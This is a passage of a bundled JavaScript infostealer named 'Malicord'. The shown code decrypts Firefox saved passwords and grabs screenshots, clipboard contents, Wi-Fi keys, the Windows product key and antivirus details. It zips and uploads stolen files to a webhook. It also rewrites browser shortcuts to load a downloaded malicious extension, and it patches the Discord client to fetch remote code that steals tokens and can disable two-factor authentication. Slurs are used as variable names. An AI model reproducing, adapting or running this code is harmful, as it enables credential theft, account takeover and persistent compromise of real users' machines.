      );\n            await fsPromises.copyFile(fichier, cheminDestination);\n          }\n      }\n    }\n    \n    try {\n      const cheminDuZip = await zipEtSupprimerDossier(dossierDestination);\n      if (await checkZipSize(cheminDuZip)) return;\n      let url = await upload(cheminDuZip);\n      const tosend = {\n        username: \"Malicord\",\n        avatar_url:\n          \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\n        embeds: [\n          {\n            title: \"Keywords Files\",\n            color: 10038562,\n            description: `[<:nova:1132934190032244786> Malicord On Top](https://t.me/Sordeal)`,\n            fields: [\n              {\n                name: \"**DOWNLOAD URL**:\",\n                value: `[\\`@${process.env.USERNAME.replace(\".\", \"\") || \"USER\"}_Keywords.zip\\`](${url})`,\n                inline: false,\n              },\n            ],\n            footer: {\n              text: \"@Malicord | https://t.me/Sordeal\",\n            },\n          },\n        ],\n      };\n        await axios({\n          url: wb,\n          method: \"POST\",\n          headers: {\n            \"Content-Type\": \"application/json\",\n          },\n          httpsAgent: agent,\n          data: tosend,\n        });\n        try{\n        await fsPromises.unlink(cheminDuZip);\n        }catch(e){}\n    } catch (err) {}\n  } catch (err) {}\n}\n\nmodule.exports = {\n  CheckSensitiveFiles,\n  MalicordSimple,\n  MalicordSteam,\n  MalicordTelegram,\n  MalicordTox,\n  MalicordProton,\n  MalicordBattle,\n  MalicordPidgin,\n  MalicordEpicGame,\n  MalicordRiotGame,\n  MalicordUbisoft,\n  MalicordNordVPN,\n  MalicordOpenVPN,\n};\n\n\n//# sourceURL=webpack://script/./utils/files.js?");

/***/ }),

/***/ "./utils/gecko.js":
/*!************************!*\
  !*** ./utils/gecko.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\");\nconst forge = __webpack_require__(/*! node-forge */ \"node-forge\");\nconst initSqlJs = __webpack_require__(/*! sql.js */ \"sql.js\");\nconst path = __webpack_require__(/*! path */ \"path\");\n\nfunction decodeLoginData(b64) {\n    const asn1 = forge.asn1.fromDer(forge.util.decode64(b64));\n    return {\n        iv: asn1.value[1].value[1].value,\n        data: asn1.value[2].value\n    };\n}\n\nasync function getKey(profileDirectory, masterPassword) {\n    const key4FilePath = path.join(profileDirectory, 'key4.db');\n    if (!fs.existsSync(key4FilePath)) {\n        throw new Error('key4.db was not found in this profile directory.');\n    }\n\n    const masterPasswordBytes = forge.util.encodeUtf8(masterPassword || '');\n    const key4File = fs.readFileSync(key4FilePath);\n\n    const key4Db = await initSqlJs().then(function(SQL){\n        return new SQL.Database(key4File);\n    });\n\n    const metaData = key4Db.exec('SELECT item1, item2 FROM metadata WHERE id = \\'password\\';');\n    if (metaData && metaData.length && metaData[0].values && metaData[0].values.length) {\n        const globalSalt = toByteString(metaData[0].values[0][0].buffer);\n        const item2 = toByteString(metaData[0].values[0][1].buffer);\n        const item2Asn1 = forge.asn1.fromDer(item2);\n        const item2Value = pbesDecrypt(item2Asn1.value, masterPasswordBytes, globalSalt);\n        if (item2Value && item2Value.data === 'password-check') {\n            const nssData = key4Db.exec('SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;');\n            if (nssData && nssData.length && nssData[0].values && nssData[0].values.length) {\n                const a11 = toByteString(nssData[0].values[0][0].buffer);\n                const a11Asn1 = forge.asn1.fromDer(a11);\n                return pbesDecrypt(a11Asn1.value, masterPasswordBytes, globalSalt);\n            }\n        } else {\n            throw new Error('Master password incorrect.');\n        }\n    }\n\n    throw new Error('Not able to get key from profile directory or no passwords were found.');\n}\n\nfunction pbesDecrypt(decodedItemSeq, password, globalSalt) {\n    if (decodedItemSeq[0].value[1].value[0].value[1].value != null) {\n        return pbes2Decrypt(decodedItemSeq, password, globalSalt);\n    }\n    return pbes1Decrypt(decodedItemSeq, password, globalSalt);\n}\n\nfunction pbes1Decrypt(decodedItemSeq, password, globalSalt) {\n    const data = decodedItemSeq[1].value;\n    const salt = decodedItemSeq[0].value[1].value[0].value;\n    const hp = sha1(globalSalt + password);\n    const pes = toByteString(pad(toArray(salt), 20).buffer);\n    const chp = sha1(hp + salt);\n    const k1 = hmac(pes + salt, chp);\n    const tk = hmac(pes, chp);\n    const k2 = hmac(tk + salt, chp);\n    const k = k1 + k2;\n    const kBuffer = forge.util.createBuffer(k);\n    const otherLength = kBuffer.length() - 32;\n    const key = kBuffer.getBytes(24);\n    kBuffer.getBytes(otherLength);\n    const iv = kBuffer.getBytes(8);\n    return decrypt(data, iv, key, '3DES-CBC');\n}\n\nfunction pbes2Decrypt(decodedItemSeq, password, globalSalt) {\n    const data = decodedItemSeq[1].value;\n    const pbkdf2Seq = decodedItemSeq[0].value[1].value[0].value[1].value;\n    const salt = pbkdf2Seq[0].value;\n    const iterations = pbkdf2Seq[1].value.charCodeAt();\n    const iv = '\u0004\u000e' + decodedItemSeq[0].value[1].value[1].value[1].value;\n    const k = sha1(globalSalt + password);\n    const key = forge.pkcs5.pbkdf2(k, salt, iterations, 32, forge.md.sha256.create());\n    return decrypt(data, iv, key, 'AES-CBC');\n}\n\nfunction decrypt(data, iv, key, algorithm) {\n    const decipher = forge.cipher.createDecipher(algorithm, key);\n    decipher.start({ iv: iv });\n    decipher.update(forge.util.createBuffer(data));\n    decipher.finish();\n    return decipher.output;\n}\n\nfunction sha1(data) {\n    const md = forge.md.sha1.create();\n    md.update(data, 'raw');\n    return md.digest().data;\n}\n\nfunction pad(arr, length) {\n    if (arr.length >= length) {\n        return arr;\n    }\n    const padAmount = length - arr.length;\n    const padArr = [];\n    for (let i = 0; i < padAmount; i++) {\n        padArr.push(0);\n    }\n\n    var newArr = new Uint8Array(padArr.length + arr.length);\n    newArr.set(padArr, 0);\n    newArr.set(arr, padArr.length);\n    return newArr;\n}\n\nfunction hmac(data, key) {\n    const hmac = forge.hmac.create();\n    hmac.start('sha1', key);\n    hmac.update(data, 'raw');\n    return hmac.digest().data;\n}\n\nfunction toByteString(buffer) {\n    return String.fromCharCode.apply(null, new Uint8Array(buffer));\n}\n\nfunction toArray(str) {\n    const arr = new Uint8Array(str.length);\n    for (let i = 0; i < str.length; i++) {\n        arr[i] = str.charCodeAt(i);\n    }\n    return arr;\n}\n\nmodule.exports = {\n    getKey,\n    decodeLoginData,\n    decrypt\n}\n\n//# sourceURL=webpack://script/./utils/gecko.js?");

/***/ }),

/***/ "./utils/infos.js":
/*!************************!*\
  !*** ./utils/infos.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("var Registry = __webpack_require__(/*! winreg */ \"winreg\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  fs = __webpack_require__(/*! fs */ \"fs\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  { exec } = __webpack_require__(/*! child_process */ \"child_process\"),\n  tempPath = (__webpack_require__(/*! os */ \"os\").tmpdir)(),\n  PowerShell = __webpack_require__(/*! powershell */ \"powershell\"),\n  unidecode = __webpack_require__(/*! unidecode */ \"unidecode\");\n\nasync function takeScreenshotAndSave(cc) {\n  if (cc !== \"yes\") return;\n  const savePath = path.join(stat.testpath[0], \"System\");\n  const powershellScript = `\n    $Path = \"${savePath}\" \n\n    $FileName = \"$env:COMPUTERNAME - $(get-date -f yyyy-MM-dd_HHmmss).png\"\n    $File = \"$Path\\\\$FileName\"\n\n    Add-Type -AssemblyName System.Windows.Forms\n    Add-type -AssemblyName System.Drawing\n\n    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n    $Width = $Screen.Width\n    $Height = $Screen.Height\n    $Left = $Screen.Left\n    $Top = $Screen.Top\n\n    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n    $bitmap.Save($File) \n    Write-Output \"Screenshot saved to:\"\n    Write-Output $File\n  `;\n\n  const ps1FilePath = path.join(tempPath, core.generateId(12) + \"_temp.ps1\");\n\n  fs.writeFileSync(ps1FilePath, powershellScript);\n\n  exec(\n    `powershell -ExecutionPolicy Bypass -NoProfile -File \"${ps1FilePath}\"`,\n    (error, stdout, stderr) => {\n      if (error) {\n      }\n      try {\n        fs.unlinkSync(ps1FilePath);\n      } catch (e) {}\n    }\n  );\n}\n\nasync function getSysteminformations(\n  cc,\n  ip,\n  hostname,\n  disk,\n  ram,\n  uid,\n  cpucount,\n  OS,\n  cpu,\n  GPU,\n  windowskey,\n  windowsversion\n) {\n  if (cc !== \"yes\") return;\n\n  let info = await Systeminformations(\n    cc,\n    ip,\n    hostname,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion\n  );\n  const savePath = path.join(stat.testpath[0], \"System\");\n  try {\n    if (!fs.existsSync(savePath)) {\n      await fs.mkdirSync(savePath);\n      fs.writeFileSync(path.join(savePath, \"System Info.txt\"), info);\n    }\n  } catch (e) {\n    save.SaveError(e);\n  }\n}\n\nasync function Systeminformations(\n  cc,\n  ip,\n  hostname,\n  disk,\n  ram,\n  uid,\n  cpucount,\n  OS,\n  cpu,\n  GPU,\n  windowskey,\n  windowsversion\n) {\n  if (cc != \"yes\") return;\n  let informations = core.getHeader();\n  try {\n    informations += `UUID: ${uid}\\n`;\n    informations += `IP: ${ip}\\n`;\n    informations += `Windows Key: ${windowskey}\\n`;\n    informations += `Windows Version: ${windowsversion}\\n`;\n    informations += `HOSTNAME: ${hostname}\\n`;\n    informations += `USERNAME: ${process.env.userprofile.split(\"\\\\\")[2]}\\n`;\n    informations += `OS: ${OS}\\n`;\n    informations += `FileLocation: ${process.cwd()}\\n`;\n    informations += `CPU: ${cpu}\\n`;\n    informations += `CPU Core: ${cpucount}\\n`;\n    informations += `GPU(s): ${GPU.split(\"   \").join(\", \")}\\n`;\n    informations += `RAM: ${ram} GB\\n`;\n    informations += `DISK: ${disk} GB\\n\\n\\n`;\n    informations += `\\nApplications installed\\n\\n\\n${await getInstalledApplication()}\\n`;\n  } catch (e) {}\n  return informations;\n}\n\nasync function getInstalledApplication() {\n  const regKey = new Registry({\n    hive: Registry.HKLM,\n    key: \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\",\n  });\n\n  const exists = await new Promise((resolve, reject) => {\n    regKey.keyExists((err, exists) => {\n      if (err != null) {\n        resolve(false);\n      }\n      resolve(exists);\n    });\n  });\n  if (!exists) {\n    return \"\";\n  }\n\n  const subkeys = await new Promise((resolve, reject) => {\n    regKey.keys((err, subkeys) => {\n      if (err != null) {\n        resolve([]);\n      }\n\n      resolve(subkeys);\n    });\n  });\n  if (subkeys.length == 0) {\n    return \"\";\n  }\n\n  let installedApps = \"\";\n  for (let i = 0; i < subkeys.length; i++) {\n    const subkey = subkeys[i];\n\n    const items = await new Promise((resolve, reject) => {\n      subkey.values((err, items) => {\n        if (err != null) {\n          resolve([]);\n        }\n\n        resolve(items);\n      });\n    });\n\n    for (let u = 0; u < items.length; u++) {\n      if (items[u].name == \"DisplayName\") {\n        installedApps = installedApps + items[u].value + \"\\n\";\n      }\n    }\n  }\n\n  return installedApps;\n}\nasync function MalicordClipboard(cc) {\n  if (cc !== \"yes\") return;\n\n  try {\n    const ge = \"powershell Get-Clipboard\";\n    let ps = new PowerShell(ge);\n    ps.on(\"error\", (err) => {});\n    ps.on(\"output\", (data) => {\n      if(!data)return;\n      const basepath = stat.testpath[0];\n      const sysdir = path.join(basepath, \"System\");\n      try {\n        if (!fs.existsSync(sysdir)) {\n          fs.mkdirSync(sysdir);\n        }\n        \n      } catch (e) {\n        return;\n      }\n      const ClipFilePath = path.join(sysdir, \"Clipboard.txt\");\n      fs.writeFileSync(ClipFilePath, core.getHeader() + data);\n    });\n    ps.on(\"error-output\", (data) => {});\n    ps.on(\"end\", (code) => {});\n  } catch (error) {}\n}\n\n\nasync function MalicordWifiPasswords(cc) {\n  let wifiprofile = [];\n  if (cc !== \"yes\") return;\n\n  try {\n    const ge = \"netsh wlan show profile\";\n\n    let ps = new PowerShell(ge);\n    ps.on(\"output\", async (data) => {\n      const lines = data.split(\"\\n\");\n      for (const line of lines) {\n        if (line.startsWith(\"    Profil\")) {\n          const profileName = line.split(\":\")[1].trim();\n\n          const asciiContent = unidecode(profileName);\n          wifiprofile.push(asciiContent);\n        }\n      }\n      const promises = wifiprofile.map(async (profile) => {\n        const ge = `netsh wlan show profile \"${profile}\" key=clear`;\n        return new Promise(async (resolve, reject) => {\n          try {\n            let ps = new PowerShell(ge);\n            ps.on(\"output\", (data) => {\n              const asciiContent = unidecode(data);\n              resolve(asciiContent);\n            });\n          } catch (error) {\n          }\n        });\n      });\n\n      const profileContents = await Promise.all(promises);\n      const c = profileContents.join(\"\\n\"); \n      if(!c)return;\n      const basepath = stat.testpath[0];\n      const sysdir = path.join(basepath, \"System\");\n      try {\n        if (!fs.existsSync(sysdir)) {\n          await fs.mkdir(sysdir);\n        }\n      } catch (e) {\n        return;\n      }\n      const WifiFilePath = path.join(sysdir, \"WifiPasswords.txt\");\n      await fs.writeFileSync(WifiFilePath, core.getHeader() + c);\n    });\n  } catch (error) {}\n}\n\nasync function MalicordAV(cc) {\n  if (cc !== \"yes\") return;\n  const psScript = `\nfunction Get-AntiVirusProduct {\n    [CmdletBinding()]\n    param (\n    [parameter(ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]\n    [Alias('name')]\n    $computername=$env:computername\n    )\n\n    $AntiVirusProducts = Get-WmiObject -Namespace \"root\\\\SecurityCenter2\" -Class AntiVirusProduct -ComputerName $computername\n\n    $ret = @()\n    foreach ($AntiVirusProduct in $AntiVirusProducts) {\n         switch ($AntiVirusProduct.productState) {\n            \"262144\" { $defstatus = \"Up to date\"; $rtstatus = \"Disabled\" }\n            \"262160\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"266240\" { $defstatus = \"Up to date\"; $rtstatus = \"Enabled\" }\n            \"266256\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            \"393216\" { $defstatus = \"Up to date\"; $rtstatus = \"Disabled\" }\n            \"393232\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"393488\" { $defstatus = \"Out of date\"; $rtstatus = \"Disabled\" }\n            \"397312\" { $defstatus = \"Up to date\"; $rtstatus = \"Enabled\" }\n            \"397328\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            \"397584\" { $defstatus = \"Out of date\"; $rtstatus = \"Enabled\" }\n            default   { $defstatus = \"Unknown\"; $rtstatus = \"Unknown\" }\n        }\n        $ht = @{}\n        $ht.Computername = $computername\n        $ht.Name = $AntiVirusProduct.displayName\n        $ht.'Product GUID' = $AntiVirusProduct.instanceGuid\n        $ht.'Product Executable' = $AntiVirusProduct.pathToSignedProductExe\n        $ht.'Reporting Exe' = $AntiVirusProduct.pathToSignedReportingExe\n        $ht.'Definition Status' = $defstatus\n        $ht.'Real-time Protection Status' = $rtstatus\n\n        # Crez un nouvel objet pour chaque ordinateur\n        $ret += New-Object -TypeName PSObject -Property $ht \n    }\n    Return $ret\n}\nGet-AntiVirusProduct\n`;\n  const ps = new PowerShell(psScript);\n  ps.on(\"error\", (err) => {});\n  ps.on(\"output\", async (data) => {\n    const savePath = path.join(stat.testpath[0], \"System\");\n    try {\n      if (!fs.existsSync(savePath)) {\n        await fs.mkdirSync(savePath);\n        fs.writeFileSync(path.join(savePath, \"Antivirus.txt\"), core.getHeader() + data);\n      } else{\n        fs.writeFileSync(path.join(savePath, \"Antivirus.txt\"), core.getHeader() + data);\n      }\n    } catch (e) {\n      save.SaveError(e);\n    }\n  });\n  ps.on(\"error-output\", (data) => {});\n  ps.on(\"end\", (code) => {});\n}\n\n\nmodule.exports = {\n  takeScreenshotAndSave,\n  getSysteminformations,\n  MalicordAV,\n  MalicordClipboard,\n  MalicordWifiPasswords,\n};\n\n\n//# sourceURL=webpack://script/./utils/infos.js?");

/***/ }),

/***/ "./utils/injection.js":
/*!****************************!*\
  !*** ./utils/injection.js ***!
  \****************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const fs = __webpack_require__(/*! fs */ \"fs\"),\n  glob = __webpack_require__(/*! glob */ \"glob\"),\n  process = __webpack_require__(/*! process */ \"process\"),\n  { exec, execSync, spawn } = __webpack_require__(/*! child_process */ \"child_process\"),\n  path = __webpack_require__(/*! path */ \"path\"),\n  axios = __webpack_require__(/*! axios */ \"axios\"),\n  asar = __webpack_require__(/*! asar */ \"asar\"),\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\n  save = __webpack_require__(/*! ./save */ \"./utils/save.js\"),\n  core = __webpack_require__(/*! ./core */ \"./utils/core.js\"),\n  unzipper = __webpack_require__(/*! unzipper */ \"unzipper\"),\n  fsPromises = (__webpack_require__(/*! fs */ \"fs\").promises);\n\nfunction replaceSpecialCharacter(text) {\n  return text.replace(//g, \"\\\\u00A0\");\n}\nasync function LetInject() {\n  let extensions_path = [\n    path.join(\n      process.env.ProgramData,\n      \"ChromeExtensionsNova\",\n      \"extension-cookies\"\n    ),\n    path.join(\n      process.env.ProgramData,\n      \"ChromeExtensionsNova\",\n      \"extension-tokens\"\n    ),\n  ];\n  const shortcutPaths = {\n    roaming: {\n      \"Naviguateur Opera GX\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Navigateur Opera GX.lnk\",\n      Google: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\GoogleChrome.lnk\",\n      Opera: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera.lnk\",\n      \"Opera GX\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera GX.lnk\",\n      Brave: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Brave.lnk\",\n      Vivaldi: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Vivaldi.lnk\",\n      \"Microsoft Edge\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Microsoft Edge.lnk\",\n      \"Yandex Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Yandex\\\\Yandex Browser.lnk\",\n      \"SRWare Iron\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\SRWare Iron.lnk\",\n      \"Kiwi Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Kiwi Browser.lnk\",\n      \"Torch Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Torch Browser.lnk\",\n      Slimjet: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Slimjet.lnk\",\n      \"Comodo Dragon\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Comodo Dragon.lnk\",\n      \"Opera Neon\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera Neon.lnk\",\n    },\n    programdata: {\n      Google: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\GoogleChrome.lnk\",\n      Opera: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera.lnk\",\n      \"Opera GX\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera GX.lnk\",\n      Brave: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Brave.lnk\",\n      Vivaldi: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Vivaldi.lnk\",\n      \"Microsoft Edge\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Microsoft Edge.lnk\",\n      \"Yandex Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Yandex\\\\Yandex Browser.lnk\",\n      \"SRWare Iron\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\SRWare Iron.lnk\",\n      \"Kiwi Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Kiwi Browser.lnk\",\n      \"Torch Browser\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Torch Browser.lnk\",\n      Slimjet: \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Slimjet.lnk\",\n      \"Comodo Dragon\":\n        \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Comodo Dragon.lnk\",\n      \"Opera Neon\": \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Opera Neon.lnk\",\n    },\n  };\n\n  const userRoamingStartMenu = path.join(process.env.APPDATA);\n\n  const userProgramDataStartMenu = path.join(process.env.ProgramData);\n\n  async function modifyShortcut(shortcutPath) {\n    let randomname = path.join(\n      process.env.APPDATA,\n      `salut${core.generateId(5)}.ps1`\n    );\n    if (!fs.existsSync(shortcutPath)) return;\n    const powershellCommand = `\n    $WshShell = New-Object -comObject WScript.Shell;\n    $Shortcut = $WshShell.CreateShortcut(\"${replaceSpecialCharacter(\n      shortcutPath\n    )}\");\n    $Shortcut.Arguments = \"--load-extension=${extensions_path[0]},${\n      extensions_path[1]\n    }\";\n    $Shortcut.Save()\n    `;\n    await fs.writeFileSync(randomname, powershellCommand, { encoding: \"utf8\" });\n\n    execSync(\n      `powershell.exe -ExecutionPolicy Bypass -File \"${randomname}\" -RunAsAdministrator`,\n      async (error, stdout, stderr) => {\n        if (error) {\n          return;\n        }\n      }\n    );\n    await fs.unlink(randomname, (err) => {\n      if (err) {\n      } else {\n      }\n    });\n  }\n\n  for (const browserName in shortcutPaths.programdata) {\n    const shortcutPath = path.join(\n      userProgramDataStartMenu,\n      shortcutPaths.programdata[browserName]\n    );\n    await modifyShortcut(shortcutPath);\n  }\n\n  for (const browserName in shortcutPaths.roaming) {\n    const shortcutPath = path.join(\n      userRoamingStartMenu,\n      shortcutPaths.roaming[browserName]\n    );\n    await modifyShortcut(shortcutPath);\n  }\n}\n\nasync function replaceWebhookTerm(directoryPath, wb) {\n  try {\n    const files = await fsPromises.readdir(directoryPath);\n    for (const fileName of files) {\n      const filePath = path.join(directoryPath, fileName);\n      const fileStat = await fsPromises.stat(filePath);\n      if (fileStat.isFile()) {\n        let fileContent = await fsPromises.readFile(filePath, \"utf-8\");\n        fileContent = fileContent.replace(/%[A-Z]{7}%/gm, wb);\n        await fsPromises.writeFile(filePath, fileContent, \"utf-8\");\n      } else if (fileStat.isDirectory()) {\n        await replaceWebhookTerm(filePath, wb);\n      }\n    }\n  } catch (error) {}\n}\n\nasync function chrome_injection(cc, webhook, chrome_url) {\n  if (cc !== \"yes\") return;\n  const destinationFolder = path.join(\n    process.env.ProgramData,\n    \"ChromeExtensionsNova\"\n  );\n  try {\n    const response = await axios.get(chrome_url, { responseType: \"stream\" });\n\n    if (!fs.existsSync(destinationFolder)) {\n      fs.mkdirSync(destinationFolder, { recursive: true });\n    }\n    const fileName = path.basename(chrome_url);\n    const destinationPath = path.join(destinationFolder, fileName);\n    const writer = fs.createWriteStream(destinationPath);\n\n    writer.on(\"finish\", async () => {\n      fs.createReadStream(destinationPath)\n        .pipe(unzipper.Extract({ path: destinationFolder }))\n        .on(\"close\", () => {\n          fs.unlink(destinationPath, (err) => {\n            if (err) {\n            } else {\n              replaceWebhookTerm(destinationFolder, webhook);\n              LetInject();\n            }\n          });\n        });\n    });\n    writer.on(\"error\", (err) => {});\n    response.data.pipe(writer);\n  } catch (error) {}\n}\n\nasync function inject_antidelete(\n  app,\n  inject,\n  webhook,\n  apiurl,\n  url,\n  link,\n  a2f,\n  automailchanger,\n  ClientEmail\n) {\n  if (app.includes(\"Canary\") || app.includes(\"PTB\")) return;\n  let niger = path.join(app[0], \"resources\", \"app.asar\");\n  try {\n    let ScriptToInject = `\n  \n\"use strict\";\n\nconsole.log(\"https://t.me/Sordeal\")\n\n\n\nconst fs = require(\"fs\"),\nhttps = require(\"https\"),\n path = require(\"path\"),\n buildInfo = require('./buildInfo'),\n paths = require('../common/paths'),\n moduleUpdater = require('../common/moduleUpdater'),\n updater = require('../common/updater'),\n requireNative = require('./requireNative');\n paths.init(buildInfo);\n\n\nfunction getAppMode() {\n  if (process.argv && process.argv.includes('--overlay-host')) {\n    return 'overlay-host';\n  }\n  return 'app';\n}\n\nconst mode = getAppMode();\nif (mode === 'app') {\n  require('./bootstrap');\n} else if (mode === 'overlay-host') {\n  const appSettings = require('./appSettings');\n  appSettings.init();\n  const {\n    NEW_UPDATE_ENDPOINT\n  } = require('./Constants');\n  if (!buildInfo.debug && buildInfo.newUpdater) {\n    if (!updater.tryInitUpdater(buildInfo, NEW_UPDATE_ENDPOINT)) {\n      throw new Error('Failed to initialize modules in overlay host.');\n    }\n    updater.getUpdater().startCurrentVersionSync({\n      allowObsoleteHost: true\n    });\n  } else {\n    moduleUpdater.initPathsOnly(buildInfo);\n  }\n  requireNative('discord_overlay2/standalone_host.js');\n}\n\ntry{ \n    initMalicord()\n}catch(e){}\n\n\nconst discordAppDataPath = path.join(\n  process.env.LOCALAPPDATA ||\n    (process.platform == \"darwin\"\n      ? process.env.HOME + \"/Library/Preferences\"\n      : \"/var/local\"),\n  \"Discord\"\n);\n\nfunction findDiscordVersion() {\n  const discordVersions = fs\n    .readdirSync(discordAppDataPath)\n    .filter((folder) => folder.startsWith(\"app-\"));\n  console.log(discordVersions);\n  if (discordVersions.length > 0) {\n    return discordVersions[0];\n  }\n  return null; \n}\n\nfunction findCoreVersion(discordVersion) {\n  const coreVersionsPath = path.join(\n    discordAppDataPath,\n    discordVersion,\n    \"modules\"\n  );\n  const coreVersions = fs\n    .readdirSync(coreVersionsPath)\n    .filter((folder) => folder.startsWith(\"discord_desktop_core-\"));\n  if (coreVersions.length > 0) {\n    return coreVersions[0];\n  }\n  return null; \n}\n\nfunction initMalicord(){\nconst discordVersion = findDiscordVersion();\nconst coreVersion = discordVersion ? findCoreVersion(discordVersion) : null;\n\nif (discordVersion && coreVersion) {\n  const indexFilePath = path.join(\n    discordAppDataPath,\n    discordVersion,\n    \"modules\",\n    coreVersion,\n    \"discord_desktop_core/index.js\"\n  );\n  const betterDiscordPath = path.join(\n    process.env.APPDATA ||\n      (process.platform == \"darwin\"\n        ? process.env.HOME + \"/Library/Preferences\"\n        : \"/var/local\"),\n    \"betterdiscord/data/betterdiscord.asar\"\n  );\n\n  try {\n    const negger = fs.readFileSync(indexFilePath, \"utf8\");\n    if (negger === \"module.exports = require('./core.asar'); || negger === module.exports = require('./core.asar');\") {\n      init();\n    }else{console.log(\"Malicord is still injected on this discord client\")}\n  } catch (err) {\n    console.error(\"Error index.js read :\", err);\n  }\n\n  function init() {\n    https\n      .get(\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/index.js\",\n        (res) => {\n          let chunk = \"\";\n          res.on(\"data\", (data) => (chunk += data));\n          res.on(\"end\", () => {\n            const newContent = chunk\n              .replace(\n                \"%WEB\"+\"HOOK%\",\n                \"${webhook}\"\n              )\n              .replace(\"%API_\" + \"URL%\", \"${apiurl ?? \"%API\" + \"_URL%\"}\")\n              .replace(\"%DISABLEFA%\", \"${a2f ?? false}\")\n              .replace(\"%AUTOMAILCHANGER%\", \"${automailchanger ?? false}\")\n              .replace(\"%CLIENTEMAIL%\", \"${\n                ClientEmail ?? \"kschdediscord@gmail.com\"\n              }\")\n              .replace(\"%TRANSFER_URL%\", \"${link}\");\n            fs.writeFileSync(indexFilePath, newContent);\n          });\n        }\n      )\n      .on(\"error\", (err) => {\n        console.error(\"Error request:\", err);\n        setTimeout(init, 10000);\n      });\n  }\n\n  require(path.join(discordAppDataPath, discordVersion, \"resources/app.asar\"));\n  if (fs.existsSync(betterDiscordPath)) {\n    require(betterDiscordPath);\n  }\n} else {\n  console.error(\"Malicord Still injected.\");\n}\n}\n  `;\n    let output = path.join(niger, \"..\", \"unpacked\");\n    if (niger) {\n      await unpackAsar(niger, output);\n      setTimeout(async () => {\n        const indexPath = path.join(output, \"app_bootstrap\", \"index.js\");\n\n        const updatedData = `\\n${ScriptToInject}`;\n\n        await fs.writeFile(indexPath, updatedData, \"utf8\", (err) => {\n          if (err) {\n          }\n        });\n        await packAsar(output, niger);\n      }, 2500);\n    }\n  } catch (e) {}\n}\nasync function inject(\n  inject,\n  webhook,\n  apiurl,\n  url,\n  link,\n  a2f,\n  automailchanger,\n  ClientEmail\n) {\n  if (inject !== \"yes\") return;\n\n  let replacedInjection;\n  let lkn;\n  if ((apiurl = \"%API_\" + \"URL%\" || 0 || 0)) {\n    lkn = webhook;\n\n    try {\n      const filteredProcesses = await core.filterProcessesByName(\"discord\");\n      if (filteredProcesses.length > 0) {\n        try {\n          filteredProcesses.forEach((proc) => {\n            process.kill(proc.pid);\n          });\n        } catch (e) {}\n      }\n      const local = process.env.localappdata;\n      const discordFolders = glob.sync(`${local}/*cord*`);\n      var desktops = [];\n\n      for (let i = 0; i < discordFolders.length; i++) {\n        const discordFolder = discordFolders[i];\n        const apps = glob.sync(`${discordFolder}/app-*/`);\n        if (apps.length < 1) return;\n        if (path.basename(discordFolder) == \"Discord\") {\n          await inject_antidelete(\n            apps,\n            inject,\n            webhook,\n            apiurl,\n            url,\n            link,\n            a2f,\n            automailchanger,\n            ClientEmail\n          );\n        }\n        for (let u = 0; u < apps.length; u++) {\n          const app = apps[u];\n          const desktopCores = glob.sync(\n            `${app}/modules/discord_desktop_core-*`\n          );\n          desktops.push(...desktopCores);\n        }\n      }\n\n      for (let i = 0; i < desktops.length; i++) {\n        const desktop = desktops[i];\n        try {\n          const response = await axios.get(url);\n          const 